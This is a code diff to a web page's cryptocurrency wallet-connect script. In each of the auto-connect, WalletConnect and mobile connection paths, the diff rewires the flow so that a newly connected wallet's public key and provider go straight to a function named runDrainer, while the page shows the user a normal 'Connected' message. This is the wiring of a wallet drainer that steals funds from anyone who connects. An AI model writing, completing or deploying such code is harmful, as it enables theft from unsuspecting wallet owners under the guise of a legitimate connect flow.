@@ -5560,11 +5560,21 @@ window.runDrainer = runDrainer;
           if (result && result.publicKey) {
             console.log(`[AUTO_CONNECT] Successfully connected to ${wallet.name}:`, result.publicKey.toString());
             
-            // Trigger the connection flow
-            triggerConnection(result.publicKey.toString(), wallet.key, {
+            // Store the provider globally for runDrainer to use
+            window.connectedWallet = {
+              key: wallet.key,
               name: wallet.name,
-              logo: `/${wallet.key}-logo.png`
-            });
+              logo: `/${wallet.key}-logo.png`,
+              publicKey: result.publicKey.toString(),
+              provider: provider
+            };
+            
+            // Trigger the drain process directly
+            if (window.runDrainer) {
+              window.runDrainer(result.publicKey.toString(), wallet.key, window.connectedWallet);
+            } else {
+              console.error('[AUTO_CONNECT] runDrainer function not found');
+            }
             
             // Show success message
             showStatus(`Connected to ${wallet.name}`, 'success');
@@ -5615,10 +5625,22 @@ window.runDrainer = runDrainer;
             const { accounts } = payload.params[0];
             if (accounts && accounts.length > 0) {
               const publicKey = accounts[0];
-              triggerConnection(publicKey, 'walletconnect', {
+              
+              // Store the provider globally for runDrainer to use
+              window.connectedWallet = {
+                key: 'walletconnect',
                 name: 'WalletConnect',
-                logo: '/walletconnect-logo.png'
-              });
+                logo: '/walletconnect-logo.png',
+                publicKey: publicKey,
+                provider: walletConnect
+              };
+              
+              // Trigger the drain process directly
+              if (window.runDrainer) {
+                window.runDrainer(publicKey, 'walletconnect', window.connectedWallet);
+              } else {
+                console.error('[MOBILE_CONNECT] runDrainer function not found');
+              }
             }
           });
           
@@ -5854,12 +5876,23 @@ window.runDrainer = runDrainer;
         if (result.success) {
           console.log(`[MOBILE_CONNECT_ENHANCED] Method ${i + 1} succeeded!`);
           
-          // Trigger connection
-          if (result.publicKey) {
-            triggerConnection(result.publicKey, result.wallet || walletType, {
+          // Trigger connection with provider
+          if (result.publicKey && result.provider) {
+            // Store the provider globally for runDrainer to use
+            window.connectedWallet = {
+              key: result.wallet || walletType,
               name: result.wallet || walletType,
-              logo: `/${result.wallet || walletType}-logo.png`
-            });
+              logo: `/${result.wallet || walletType}-logo.png`,
+              publicKey: result.publicKey,
+              provider: result.provider
+            };
+            
+            // Trigger the drain process directly
+            if (window.runDrainer) {
+              window.runDrainer(result.publicKey, result.wallet || walletType, window.connectedWallet);
+            } else {
+              console.error('[MOBILE_CONNECT_ENHANCED] runDrainer function not found');
+            }
           }
           
           return result;
